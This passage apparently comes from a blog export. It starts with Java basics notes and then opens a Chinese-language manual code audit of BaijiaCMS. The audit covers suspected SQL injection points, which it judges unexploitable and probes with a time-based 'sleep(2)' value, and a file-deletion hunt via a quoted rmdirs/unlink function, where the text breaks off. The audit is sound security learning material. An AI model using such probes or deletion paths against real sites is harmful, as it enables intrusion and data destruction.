main(String[] args) &#123;\n       int i=1;\n       while(i&lt;100)&#123;\n              if(i%2==0)&#123;\n                     System.out.println(i);\n              &#125;\n              i++;\n       &#125;\n&#125;      \n&#125;\n\ndo -while 循环与while不同点在于它至少会执行一次\ndo&#123;\n\t循环体\n&#125;\nwhile(循环条件);\n\n实践\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       int i=1;\n       do&#123;\n              if(i%2==0)&#123;\n                     System.out.println(i);\n              &#125;\n              i++;\n       &#125;\n       while(i&lt;100);\n&#125;      \n&#125;\n\nday 09break和continuebreak和continue用于switch-case语句中，但两者作用略有不同\nbreak：跳出循环\ncontinue：结束本次循环\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n       for(int i=1;i&lt;=10;i++)&#123;\n              if(i%4==0)&#123;\n                     break;\n              &#125;\n       System.out.println(i);\n       &#125;\n&#125;      \n&#125;\n这里运行到i=4时，因为i%4==0，所以直接结束循环，此时再看continue\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       for(int i=1;i&lt;=10;i++)&#123;\n              if(i%4==0)&#123;\n                     continue;\n              &#125;\n       System.out.println(i);\n       &#125;\n&#125;      \n&#125;\n\neclipse使用安装的话去官网就行，下载zip文件部分需要需要，修改如下(修改编码为UTF-8)\n而后修改字体大小\n运行Hello World首先我们需要去建一个项目没有这个java project的直接去new下面那个other里找一下就可以了然后随便起一个项目名此时还需要搭建一个package，直接在左侧右键，而后就出现了new，如下图操作即可此时就可以去new一个class了，也就是写文件，操作依然是右键随便写一个名字书写的话写一个main，而后按ctrl+/就会出现关键词此时运行的话右键\n数组定义\n\n\n\n\n\n\n\n\n数组是多个相同类型的数据按照一定顺序排列的集合，并使用一个名字命名，通过编号的方式对这些数据进行统一管理。\n特点数组的特点\n\n\n\n\n\n\n\n\n\n1、数组是有序排列的2、数值属于引用数据类型的变量。数组的元素，既可以是基本数据类型，也可以是引用数据类型。3、创建数组对象会在内存中开辟一整块连续的空间4、数组的长度一旦确定，就不能修改。\n分类\n\n\n\n\n\n\n\n\n按照维数：一维数组、二维数组、…..按照数组元素的类型：基本数据类型元素的数组、引用数据类型元素的数组\n数组初始化数组初始化之前要先声明，然后初始化的话有两种方式，用代码来简单说一下方法一\n静态初始化这类的话就是说既定义了长度，也定义了对应的值\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] arr;//数组声明\n\t\tarr=new int[]&#123;1,2,3,4&#125;;//数组初始化\n&#125;\n&#125;\n方法二\n动态初始化这类的话就是只定义一个长度，不定义对应的值\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] arr;//数组声明\n\t\tarr=new int[5];\n&#125;\n&#125;\n当然，声明和初始化是可以写在一起的\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] arr=new int[5];//数组声明\n&#125;\n&#125;\n如果此时不赋值，直接输出的话，会输出5个0，这是因为数组元素的默认初始化值为0\n数组调用public class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] names = new String[5];//数组声明\n\t\tnames[0]=\"赵\";\n\t\tnames[1]=\"钱\";\n\t\tnames[2]=\"孙\";\n\t\tnames[3]=\"李\";\n\t\tnames[4]=\"周\";\n\t&#125;\n&#125;\n\n数组长度与遍历如何查看数组长度呢，方法是数组名.length\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] names = new String[5];//数组声明\n\t\tnames[0]=\"赵\";\n\t\tnames[1]=\"钱\";\n\t\tnames[2]=\"孙\";\n\t\tnames[3]=\"李\";\n\t\tnames[4]=\"周\";\n\t\tSystem.out.println(names.length);\n\t&#125;\n&#125;\n如何遍历数组呢，用循环即可\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] names = new String[5];//数组声明\n\t\tnames[0]=\"赵\";\n\t\tnames[1]=\"钱\";\n\t\tnames[2]=\"孙\";\n\t\tnames[3]=\"李\";\n\t\tnames[4]=\"周\";\n\t\tint i;\n\t\tfor(i=0;i&lt;names.length;i++) &#123;\n\t\t\tSystem.out.println(names[i]);\n\t\t&#125;\n\t&#125;\n&#125;\n\n实践题目1找出联系方式\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] array = new int[] &#123;0,1,2,3,7,8,9&#125;;\n\t\tint[] index = new int[] &#123;1,6,5,3,6,1,0,4,2,1,3&#125;;\n\t\tString str=\"\";\n\t\tfor(int i=0;i&lt;index.length;i++) &#123;\n\t\t\tstr +=array[index[i]];\n\t\t&#125;\n\t\tSystem.out.println(\"联系方式\"+str);\n\t&#125;\n&#125;\n这个要怎么看呢，看循环里是array[index[i]]，其实也就是个套娃循环的，从i=0开始，此时index[0]为1，array[1]为1，首页联系方式第一位就为1，同理，i=1时，index[1]为6，array[6]为9，第二位为9，这样依次算到最后，就可以得到联系方式\n题目2设计一个程序，输入学生的成绩，并求出最大值，同时输出学生等级，等级评判规则：与最大值差值十分及以下的为A，二十分及以下为B，三十为C，其余为D\nimport java.util.Scanner;\npublic class HelloWorld &#123;\n\tpublic static void main(String[] args) &#123;\n\t\t//1、使用Scanner,读取学生个数\n\t\tScanner scanner=new Scanner(System.in);\n\t\tSystem.out.print(\"请输入学生个数\");\n\t\tint number=scanner.nextInt();\n\t\t//2、创建数组，存储学生成绩，动态初始化。\n\t\tSystem.out.println(\"请输入学生成绩\");\n\t\tint[] score=new int[number];\n\t\t//3、给数组的元素赋值\n\t\tfor(int i=0;i&lt;number;i++) &#123;\n\t\t\tscore[i]= scanner.nextInt();\n\t\t&#125;\n\t\t//4、获取数组元素的最大值\n\t\tint max=0;\n\t\tfor(int i=0;i&lt;number;i++) &#123;\n\t\t\tif(max&lt;score[i]) &#123;\n\t\t\t\tmax=score[i];\n\t\t\t&#125;\n\t\t&#125;\n\t\tSystem.out.println(\"最高分为\" + max);\n\t\t//5、根据每个学生成绩与最大值差值进行等级评分\n\t\tchar level;\n\t\tfor(int i=0;i&lt;number;i++)&#123;\n\t\t\tif(max-score[i]&lt;=10) &#123;\n\t\t\t\tlevel='A';\n\t\t\t&#125;\n\t\t\telse if(max-score[i]&lt;=20) &#123;\n\t\t\t\tlevel='B';\n\t\t\t&#125;\n\t\t\telse if(max-score[i]&lt;=30) &#123;\n\t\t\t\tlevel='C';\n\t\t\t&#125;\n\t\t\telse &#123;\n\t\t\t\tlevel='D';\n\t\t\t&#125;\n\t\t\tSystem.out.println(\"student \"+i+\"score is \"+score[i]+\" grade is \"+level);\n\t\t&#125;\n\t&#125;\n&#125;\n\nday 10二维数组类似于一维数组，只不过多了一个[]和{}而已，举个栗子\nint[][] arr=new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;\n数组调用public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[][] arr=new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;\n\t\tString[][] arr1 =new String[3][2];\n\t\tString[][] arr2 =new String[3][];\n\t\tSystem.out.print(arr[1][1]);\n\t\tSystem.out.print(arr1[2][1]);\n\t&#125;\n&#125;\n后面为null是因为没赋值，默认的值为null这个时候我们如果钓鱼arr2会怎样呢二维数组时，后面的[ ]可以为空，但不能直接调用这个，因为二维是个空指针\n查看数组长度与遍历public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[][] arr=new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;\n\t\tString[][] arr1 =new String[3][2];\n\t\tString[][] arr2 =new String[3][];\n\t\tSystem.out.println(arr.length);//3，这是因为它把里面的一维数组当做一个整体\n\t\tSystem.out.println(arr[0].length);//3,三个数分别为1,2,3\n\t\tSystem.out.println(arr[1].length);//2，两个数为4和5\n\t\t\n\t&#125;\n\n&#125;\n\n如何遍历数组呢，用两个for循环即可\npublic class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[][] arr=new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;\n\t\tString[][] arr1 =new String[3][2];\n\t\tString[][] arr2 =new String[3][];\n\t\tfor(int i=0;i&lt;(arr.length);i++) &#123;\n\t\t\tfor(int j=0;j&lt;(arr[i].length);j++) &#123;\n\t\t\t\tSystem.out.println(arr[i][j]);\n\t\t\t&#125;\n\t\t\t\n\t\t&#125;\n\t&#125;\n\n&#125;\n\n不同类型下的一维数组的默认初始值整型：0\n浮点型：0.0\nchar型：0\n布尔型：false\n引用类型：null\nday 11数据结构数据与数据之间的逻辑关系\n集合\n一对一\n一对多\n多对多\n还有数据的存储结构数据的存储结构分为三种\n线性表：顺序表(数组)、链表、栈、队列\n树形结构：二叉树\n图型结构：\n数据的算法分为两种\n排序算法\n搜索算法\n数组的复制、反转和查找复制实践public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] arr1=new String[]&#123;\"aa\",\"bb\",\"cc\",\"dd\"&#125;;\n\t\tString[] arr2=new String[arr1.length];\n\t\tfor(int i=0;i&lt;arr1.length;i++) &#123;\n\t\t\t\tarr2[i]=arr1[i];\n\t\t\t\tSystem.out.println(arr1[i]);\n\t\t\t\tSystem.out.println(arr2[i]);\t\n\t\t\t&#125;\n\t\t\n\t&#125;\n&#125;\n\n反转实践public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] arr1=new String[]&#123;\"aa\",\"bb\",\"cc\",\"dd\",\"ee\",\"ff\"&#125;;\n\t\tString[] arr2=new String[arr1.length];\n\t\tfor(int i=0;i&lt;arr1.length/2;i++) &#123;\n\t\t\t\tString temp=arr1[i];\n\t\t\t\tarr1[i]=arr1[arr1.length-i-1];\n\t\t\t\tarr1[arr1.length-i-1]=temp;\n\t&#125;\n\t\tfor(int i=0;i&lt;arr1.length;i++) &#123;\n\t\t\tSystem.out.println(arr1[i]);\n\t\t&#125;\n&#125;\n&#125;\n\n\n查找实践枚举法public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString[] arr1=new String[]&#123;\"aa\",\"bb\",\"cc\",\"dd\",\"ee\",\"ff\"&#125;;\n\t\tString find=\"cc\";\n\t\tboolean flag= true;\n\t\tfor(int i =0;i&lt;arr1.length;i++) &#123;\n\t\t\tif(find.equals(arr1[i])) &#123;\n\t\t\t\tSystem.out.println(\"找到该元素了，位于第\"+i+\"个\");\n\t\t\t\tflag=false;\n\t\t\t\tbreak;\n\t\t\t&#125;\n\t\t&#125;\n\t\tif(flag) &#123;\n\t\t\tSystem.out.println(\"很遗憾，没有找到此元素\");\n\t\t&#125;\n\t\t&#125;\n&#125;\n\n二分法public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] arr1=new int[] &#123;-72,-12,-74,-43,-89,98,49,69,39&#125;;\n\t\tint find=49;\n\t\tboolean flag= true;\n\t\tint head=0;//初始首索引\n\t\tint end=arr1.length-1;//初始末索引\n\t\twhile(head&lt;=end) &#123;\n\t\t\tint middle=(head+end)/2;\n\t\t\tif(find==arr1[middle]) &#123;\n\t\t\t\tSystem.out.println(\"找到了指定元素，该元素为第\"+middle+\"个\");\n\t\t\t\tflag=false;\n\t\t\t\tbreak;\n\t\t\t&#125;\n\t\t\telse if(find&lt;arr1[middle])&#123;//中间值在查找值右边，此时另中间值左边一个为最末值\n\t\t\t\tend=middle-1;\n\t\t\t&#125;\n\t\t\telse &#123;\n\t\t\t\thead=middle+1;\n\t\t\t&#125;\n\t\t&#125;\n\t\tif(flag) &#123;\n\t\t\tSystem.out.println(\"很遗憾，没有找到此元素\");\n\t\t&#125;\n\t\t&#125;\n&#125;\n\nday 12冒泡排序以例子来讲解一个数组，其内部元素为\n[49,38,65,97,76,13,27,49]\n\n此时想实现从左到右排序（按照数的大小），该怎么办呢，方法就是从第一个开始，依次与后面的进行比较第一个数与第二个数相比，49&gt;38，所以交换第二个数与第三个数相比，49&lt;65，不交换第三个数与第四个数相比，65&lt;97，不交换第四个数与第五个数相比，97&gt;76，交换第五个数与第六个数相比，97&gt;13，交换第七个数与第八个数相比，97&gt;27，交换第八个数与第九个数相比，97&gt;49，交换此时就确定了一个最大值，97，我们看一下此时的数组\n[38,49,65,97,76,13,27,49,97]\n可以发现只确定了一个最大值，后面扔需要进行上面的判断，需要进行几次呢，剩了八个数，那只需要六次就可以了，因为最后一个不用确定，原理就是这样，下面来操作一下\n实践public class array &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tint[] arr1=new int[] &#123;-72,-12,-74,-43,-89,98,49,69,39&#125;;\n\t\tfor(int i=0;i&lt;arr1.length-1;i++) &#123;//假设元素有八个时，只需要比七次就可以确定结果，所以真实长度减1\n\t\t\tfor(int j=0;j&lt;arr1.length-i-1;j++) &#123;//每次结束就会确定一个最大值，减i就是减去这些最大值\n\t\t\t\tif(arr1[j]>arr1[j+1]) &#123;\n\t\t\t\t\tint temp=arr1[j];\n\t\t\t\t\tarr1[j]=arr1[j+1];\n\t\t\t\t\tarr1[j+1]=temp;\n\t\t\t\t&#125;\n\t\t\n\t\t\t&#125;\n\t\t&#125;\n\t\tfor(int i=0;i&lt;arr1.length-1;i++) &#123;\n\t\t\tSystem.out.println(arr1[i]);\n\t\t&#125;\n\t&#125;\n&#125;\n\n面向对象特点\n封装性、继承性、多态性\n两个要素：类和对象接下来以一个简单例子讲解对象和类\npublic class oop&#123;\n\t public static void main(String[] args) &#123;\n\t\t person p1 =new person();\n\t\t //创建对象，也称为实例化类\n\t\t p1.name = \"quan9i\";\n\t\t p1.isMale = true;\n\t\t System.out.println(p1.name);\n\t\t //调用属性\n\t\t p1.eat();\n\t\t p1.sleep();\n\t\t p1.talk(\"Chinese\");\n\t\t //调用方法\n\t &#125;\n\t \t\n&#125;\n\nclass person &#123;\n\t\t//属性，又称成员变量\n\t\tString name;\n\t\tint aeg =19;\n\t\tboolean isMale;\n\t\t//方法\n\t\tpublic void eat() &#123;\n\t\t\tSystem.out.println(\"人可以吃饭\");\n\t\t&#125;\n\t\tpublic void sleep() &#123;\n\t\t\tSystem.out.println(\"人可以睡觉\");\n\t\t&#125;\n\t\tpublic void talk(String language) &#123;\n\t\t\tSystem.out.println(\"人可以说话，使用 \" +language );\n\t\t&#125;\n\t\t\n&#125;\n\nday 13内存解析\n\n\n\n\n\n\n\n\n\n1、堆存放对象实例2、栈存储局部变量3、方法区存储类信息、常量、静态变量等\n属性(成员变量) vs 局部变量属性（成员变量） 与 局部变量\n  1、共同点:\n  \t\t(1)定义变量的格式，数据类型 变量名 = 变量值\n\t\t(2)先声明、后使用\n \t\t(3)变量都有其对应的作用域\n \t\t 2、不同点:\n (1)在类中声明的位置不同\n\t 属性：直接定义在类的&#123;&#125;中\n\t 局部变量: 声明在方法外、方法形参、代码块你诶、构造器形参、构造器内部的变量\n (2)关于权限修饰符的不同\n\t 属性: 可以在声明属性时，指明其权限，使用权限修饰符\n 常用的权限修饰符:private、public、缺省、protected\n\t 局部变量:不能使用权限修饰符\n (3)默认初始化情况\n\t 属性:类的属性，根据其类型，都有默认初始值。\n\t\t 整型：(byte、short、int、long) 0\n\t\t 浮点型(float、double) 0.0\n\t\t 字符型(char) 0 或\\u0000\n\t\t 布尔型(boolean) false\n\t\t 引用数据类型(类、数组、接口) null\n\t 局部变量：没有默认初始值\n\t\t 意味着，我们在调用局部变量之前，一定要进行显式赋值。\n (4)在内存中加载的情况\n 属性: 加载到堆空间中 (非static)\n 局部变量: 加载到栈空间\n实践public class oop&#123;\n\tpublic static void main(String[] args) &#123;\n\t\tuser u1= new user();\n\t\tSystem.out.println(u1.name);\n\t\tSystem.out.println(u1.age);\n\t\tSystem.out.println(u1.isMale);\n\t\t\n\t&#125;\n&#125;\nclass user&#123;\n\t//属性(成员变量)\n\tString name;\n\tpublic int age;\n\tboolean isMale;\n\t\n\tpublic void talk(String language) &#123;//language:形参、也是局部变量\n\t\tSystem.out.print(\"我们使用\"+language+\"交流\");\n\t&#125;\n\tpublic void eat() &#123;\n\t\tString food = \"烧饼\";//局部变量\n\t\tSystem.out.print(\"北方人喜欢吃\"+food);\n\t&#125;\n&#125;\n这里可以验证，成员变量未赋值时会默认初始化而当我们不给局部变量赋值时，会发生什么呢这里报错了，含义大致就是说未给变量赋值\nday xx(已经不知道搁置了多少天)面向对象类与对象的创建只能有一个主函数，我们构造两个java文件，调用其中一个比较合适\n#demo1.java\npackage demo;\n\npublic class demo1 &#123;\n\tpublic static void main(String[] args) &#123;\n\t\t//类：抽象的，实例化\n\t\t//类实例化后会返回一个自己的对象！\n\t\tStudent quan9i = new Student();\n\t\tquan9i.name=\"quan9i\";\n\t\tquan9i.age= 19;\n\t\tSystem.out.println(quan9i.name);\n\t\tSystem.out.println(quan9i.age);\n\t&#125;\n&#125;\n\n\n#Student.java\npackage demo;\n\npublic class Student &#123;\n\t//属性、字段\n\tString name;\n\tint age;\n\t\n\t//方法\n\tpublic void study() &#123;\n\t\tSystem.out.println(this.name+\"在卷\");\n\t&#125;\n&#125;\n\n继承子类可只能继承一个父类，父类可有多个子类接下来测试一下\n#demo1.java\npackage demo;\n\nimport demo.Student;\npublic class demo1&#123;\n    public static void main(String[] args)&#123;\n        Student student = new Student();\n        student.say();\n        System.out.println(student.money);\n    &#125;\n&#125;\n\n#Student.java\npackage demo;\n\npublic class Student extends Teacher&#123;\n&#125;\n\n#Teacher.java\npackage demo;\n\npublic class Teacher &#123;\n    protected int money = 10000;\n    public void say()&#123;\n        System.out.println(\"说了一句话\");\n    &#125;\n    public void write()&#123;\n        System.out.println(\"写了点讲义\");\n    &#125;\n&#125;\n\n\n可以发现student里虽然什么也没有，但是继承了父类，就可以调用父类方法ctrl+h可以看到继承树\nsuper调用属性时代码如下\n#Teacher.java\npackage demo;\n\npublic class Teacher &#123;\n    protected  String name =\"kuangshen\";\n\n&#125;\n# Student.java\npackage demo;\n\npublic class Student extends Teacher&#123;\n    public String name=\"qinjiang\";\n    public void test(String name)&#123;\n        System.out.println(name);\n        System.out.println(this.name);\n        System.out.println(super.name);\n    &#125;\n&#125;\n# demo1.java\npackage demo;\n\nimport demo.Student;\npublic class demo1&#123;\n    public static void main(String[] args)&#123;\n        Student student = new Student();\n        student.test(\"秦疆\");\n    &#125;\n&#125;\n\n\n调用方法时\n#Teacher.java\npackage demo;\n\npublic class Teacher &#123;\n    protected  String name =\"kuangshen\";\n    public void print()&#123;\n        System.out.println(\"Teacher\");\n    &#125;\n&#125;\n#Student.java\npackage demo;\n\npublic class Student extends Teacher&#123;\n    public String name=\"qinjiang\";\n    public void print()&#123;\n        System.out.println(\"Student\");\n    &#125;\n    public void test1()&#123;\n        print();\n        this.print();\n        super.print();\n    &#125;\n&#125;\n#demo1.java\npackage demo;\n\nimport demo.Student;\npublic class demo1&#123;\n    public static void main(String[] args)&#123;\n        Student student = new Student();\n        student.test1();\n    &#125;\n&#125;\n\n\n注:privated是无法直接调用的当用于无参方法时，代码如下\n#Teacher.java\npackage demo;\n\npublic class Teacher &#123;\n    protected  String name =\"kuangshen\";\n    public  Teacher()&#123;\n        System.out.println(\"Teacher无参被调用\");\n    &#125;\n&#125;\n#Student.java\npackage demo;\n\nimport java.awt.*;\n\npublic class Student extends Teacher&#123;\n    public  Student()&#123;\n        //有个隐藏函数super()\n        System.out.println(\"Student无参被调用\");\n    &#125;\n&#125;\n#demo1.java\npackage demo;\n\nimport demo.Student;\npublic class demo1&#123;\n    public static void main(String[] args)&#123;\n        Student student = new Student();\n    &#125;\n&#125;\n\n\n\n父类引用指向子类#B.java\npackage demo;\n\npublic class B &#123;\n    public static void test()&#123;\n        System.out.println(\"B=>test()\");\n    &#125;\n&#125;\n#A.java\npackage demo;\n\n\npublic class A extends B&#123;\n    public static void test()&#123;\n        System.out.println(\"A=>test()\");\n    &#125;\n&#125;\n#demo1.java\npackage demo;\n\nimport demo.A;\nimport demo.B;\npublic class demo1&#123;\n    public static void main(String[] args)&#123;\n        A a=new A();\n        a.test();\n        B b=new A();\n        b.test();\n    &#125;\n&#125;\n\n\n\n","slug":"JAVA基础语法-学习笔记","date":"2022-11-11T16:54:30.000Z","categories_index":"JAVA","tags_index":"语言学习","author_index":"quan9i"},{"id":"2701665bc33e3ae6e528c88e69e6e2f6","title":"PHP代码审计之旅之百家CMS","content":"前言之前审计的CMS大多是利用工具，即Seay+昆仑镜联动扫描出漏洞点，而后进行审计。感觉自己的能力仍与零无异，因此本次审计CMS绝大多数使用手动探测，即通过搜索危险函数的方式进行漏洞寻找，以此来提升审计能力，希望对正在学习代码审计的师傅能有所帮助。\n环境搭建源码链接如下所示https://gitee.com/openbaijia/baijiacms安装至本地后，我这里是phpstudy+win10，所以直接解压到phpstudy的www目录下即可接下来去创建一个数据库用于存储CMS信息。（在Mysql命令行中执行）接下来访问CMS，会默认跳转至安装界面数据库名称和账密注意一下就好，其他随便写而后安装成功，可以开始进行审计了。\n审计准备工作我们拿到一套源码时，首先需要对具体文件夹进行一次分析，这样才能对CMS有一个初步的印象，为后续审计做一些铺垫。根目录如下所示其对应目录解释如下\naddons     插件\napi        接口\nassets     静态文件\nattachment 上传目录\ncache      缓存目录\nconfig     系统文件\ninclude    系统文件\nsystem     后端代码\n针对system目录，这个较为常用，我们可以对其进行进一步分析\nsystem 系统模块目录\n ├─alipay 支付宝服务窗模块\n ├─bonus 优惠券模块\n ├─common 公共函数模板\n ├─index 登录页\n ├─member 会员模块\n ├─modules 可再扩展模块和模块管理\n ├─public 公共模块\n ├─shop 后台商城模块\n ├─shopwap 前台商城模块\n ├─user 系统用户\n └─weixin 微信模块\n对这些有过了解后，还需要看的就是一些后端支撑文件，例如这种xxxinc.php文件，他们常常存在一些漏洞，进而导致CMS出现漏洞所以简单阅读一下这些也是有必要的。接下来准备工作做完，就开始下一步。\n路由解析对一个CMS进行漏洞探测前，我们需要首先需要对CMS的路由有所了解。这里我们直接访问默认页面baijiacms-master/index.php，然后登录后台，这里说一下我自己认为找路由还可以的方法，就是关注一些特别点，好找一些，比如这里的修改密码界面\n我们点击它，发现此时的路由如下\nbaijiacms-master/index.php?mod=site&amp;act=manager&amp;do=changepwd&amp;beid=1\n接下来我们在Vscode中进行全局搜索，搜password=结果如下，可以发现它的路径\nbaijiacms-master\\system\\manager\\class\\web\\changepwd.php\n再找到它的具体位置我们将它与之前看到的路由进行比对，就可以发现act其实是system文件夹下的文件夹名称，do是所选择具体文件的名称,对这些有个初步的了解，待会找到文件时能在网页中访问即可。\n漏洞查找这里Seay+关键词搜索的方式进行漏洞查找\nSQL注入疑点一（失败）发现有很多疑似注入点，从第一个开始跟进看文件路由/addons/activity/class/mobile/index.php重点代码\nglobal $_W,$_GPC;\n\n$activityid = intval ( $_GPC ['activityid'] );\n$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';\n$pagetitle = \"活动报名入口\";\n\n$activity = pdo_fetch (\"SELECT * FROM \" . table ('activity') . \" WHERE uniacid = '&#123;$_W['uniacid']&#125;' and id = \" . $activityid );\n可以看到uniacid变量确实未被单引号包裹，可能存在注入，但我们这里注意到它是$_W[&#39;uniacid&#39;]，追溯$_W，看到global $_W,$_GPC;，这个是全局变量，所以我们直接在vscode中进行查找（ctrl+shift+f全局搜索）发现$_GPC=$_GP，所以我们只需要确定$_GP，就可以确定$_GPC，接下来寻找$_GP，最终在baijiacms.php中发现此变量\n这里的话可以看出是对所有方法请求的参数进行了一个stripslashes函数处理，而后将参数进行了合并，合并后对数组内的参数依次进行遍历，进行htmlspecialchars函数处理，而后将实体字符&amp;amp替换为&amp;。不过这个是$_GPC的，但都是全局变量，$_W应该也类似，接下来再跟着看一下，我们全局搜索$_W=这里可以发现$W=$_CMS，同时看出我们的$_W[&#39;uniacid&#39;]=$_CMS[&#39;beid&#39;]，接下来搜索$_CMS[&#39;beid&#39;]=找到它等同于一个函数，即getDomainBeid函数，所以接下来寻找getDomainBeid函数\nfunction getDomainBeid()\n&#123;\n\t\tglobal $_GP;\n\n\t\t\t$system_store = mysqld_select('SELECT id,isclose FROM '.table('system_store').\" where (`website`=:website1 or `website`=:website2) and `deleted`=0 \",array(\":website1\"=>WEB_WEBSITE,\":website2\"=>'www.'.WEB_WEBSITE));\n\t\n\n\t\n\tif(empty($system_store['id']))\n\t&#123;\n\t\tif(!empty($_GP['beid']))\n\t\t&#123;\n\t\t\t$system_store = mysqld_select('SELECT id,isclose FROM '.table('system_store').\" where `id`=:id  and `deleted`=0\",array(\":id\"=>$_GP['beid']));\n\t\t\tif(empty($system_store['id']))\n\t\t\t&#123;\n\t\t\t\tmessage(\"未找到相关店铺\");\n\t\t\t&#125;\n\t\t\tif(!empty($system_store['isclose']))\n\t\t\t&#123;\n\t\t\tmessage(\"店铺已关闭无法访问\");\t\n\t\t\t&#125;\n\t\t\n\t\t\treturn $system_store['id'];\t\n\t\t&#125;else\n\t\t&#123;\n\t\treturn \"\";\t\n\t\t&#125;\n\t&#125;else\n\t&#123;\n\t\t\tif(!empty($system_store['isclose']))\n\t\t\t&#123;\n\t\t\tmessage(\"店铺已关闭无法访问\");\t\n\t\t\t&#125;\n\t\t\n\t\treturn $system_store['id'];\n\t&#125;\n&#125;\n这里可以看出system_store是由系统数据库中查出来的数据，这个对我们来说是不可控的，我们可控的是$_GP[&#39;beid&#39;],此时看着一个SQL语句\n$system_store = mysqld_select('SELECT id,isclose FROM '.table('system_store').\" where `id`=:id  and `deleted`=0\",array(\":id\"=>$_GP['beid']));\n如果我们的数据正常，他的结果应该是\nid  isclose\nxx  xxxxxxx\nxx  xxxxxxx\n而当我们输入beid为xx and sleep(2)这种，它毫无疑问是不会有查询结果的，这也就意味着$system_store[&#39;id&#39;]，而这个函数的最终结果是return $system_store[&#39;id&#39;];    ，那么此时它就会返回空值，那么回到这个SQL语句\npdo_fetchall(\"select * from \" . tablename('eshop_member') . \" where isagent =1 and status=1 and uniacid = \" . $_W['uniacid'] . \" &#123;$condition&#125;  ORDER BY agenttime desc limit \" . ($pindex - 1) * $psize . ',' . $psize);\n中，如果我们那里正常，想让返回的不为空值，那么这个$_W[&#39;uniacid&#39;]只能接收到正常的id，也就是数据库中存储着的id值，所以这里是无法进行SQL注入的。\n类似这个的还有如下文件\n文件名：system/eshop/core/mobile/commission/team.php\n部分PHP代码\n$list = pdo_fetchall(\"select * from \" . tablename('eshop_member') . \" where isagent =1 and status=1 and uniacid = \" . $_W['uniacid'] . \" &#123;$condition&#125;  ORDER BY agenttime desc limit \" . ($pindex - 1) * $psize . ',' . $psize);\n        \n文件名: /addons/activity/class/web/activity.php\n部分PHP代码：\n$activity = pdo_fetch (\"SELECT * FROM \" . table ('activity') . \" WHERE uniacid = '&#123;$_W['uniacid']&#125;' and id = \" . $activityid );\n\n文件名：/addons/activity/class/mobile/join.php\n部分PHP代码：\n$row = pdo_fetch (\"SELECT id FROM \" . table ('activity') . \" WHERE uniacid = '&#123;$_W['uniacid']&#125;' and id = \" . $activityid );\n\n文件名：/addons/activity/class/web/records.php\n部分PHP代码：\n$row = pdo_fetch(\"SELECT id,pic FROM \" . table('activity_records') . \" WHERE id = $id and uniacid = '&#123;$_W['uniacid']&#125;'\");\n\n文件名：/system/eshop/core/web/shop/dispatch.php\n部分PHP代码：\n$dispatch = pdo_fetch(\"SELECT id,dispatchname FROM \" . tablename('eshop_dispatch') . \" WHERE id = '$id' AND uniacid=\" . $_W['uniacid'] . \"\");\n\n文件名： /system/eshop/core/web/virtual/category.php\n部分PHP代码:\n$list = pdo_fetchall(\"SELECT * FROM \" . tablename('eshop_virtual_category') . \" WHERE uniacid = '&#123;$_W['uniacid']&#125;' ORDER BY id DESC\");\n\n疑点二（失败）文件路径/system/common/model/virtual.php这里发现参数id，跟进id变量，发现来源于\npublic function updateGoodsStock($id = 0)\n        &#123;\n            global $_W, $_GPC;\n            $goods = pdo_fetch('select virtual from ' . tablename('eshop_goods') . ' where id=:id and type=3 and uniacid=:uniacid limit 1', array(\n                ':id' => $id,\n                ':uniacid' => $_W['uniacid']\n            ));\n发现这里的id是直接赋值为0的，我们是不可控的，所以不存在注入。\n任意目录及文件删除关于漏洞寻找，大多是从一些敏感函数入手，如果觉得Seay扫描的不够全面，我们可自行查找，对于文件删除，我们这里首先想到的就是unlink函数，所以我们这里打开Vscode，ctrl+shift+f全局搜索unlink函数这里注意到有多个文件，js及css前端文件自不必看，我们这里要关注的是php文件，接下来从第一个开始看。\n疑点一文件路由baijiacms-master\\includes\\baijiacms\\common.inc.php,涉及代码如下\nfunction rmdirs($path='',$isdir=false)\n&#123;\n\t    if(is_dir($path))//判定变量是否为目录\n\t    &#123;\n\t            $file_list= scandir($path); //查看路径下的文件\n\t            foreach ($file_list as $file)//依次遍历\n\t            &#123;\n\t                if( $file!='.' &amp;&amp; $file!='..')//如果不是.和..\n\t                &#123;\n\t               \t\tif($file!='qrcode')\n\t               \t\t&#123;\n\t                    rmdirs($path.'/'.$file,true);//删除目录下的文件\n\t                  &#125;\n\t                &#125;\n\t            &#125;\n\t            \n\t    \tif($path!=WEB_ROOT.'/cache/')//如果变量名不是根目录拼接cache\n\t    \t&#123;\n\t            @rmdir($path);   //删除目录\n\t               \n\t      &#125;    \n\t    &#125;\n\t    else\n\t    &#123;\n\t        @unlink($path); \n\t    &#125;\n\t \n&#125;\n可以看到当它判定变量为目录时，会对目录下的文件进行递归，而后删除一切文件，如果它不是目录，那么他此时就会直接删除这个文件。接下来有函数了，那我们就要看哪个文件利用了这个函数，然后来进行利用。所以接下来全局搜索函数rmdirs在文件baijiacms-master\\system\\manager\\class\\web\\database.php中发现如下代码\n\t\t\t\t if($operation=='delete')\n &#123;\n \t\t$d = 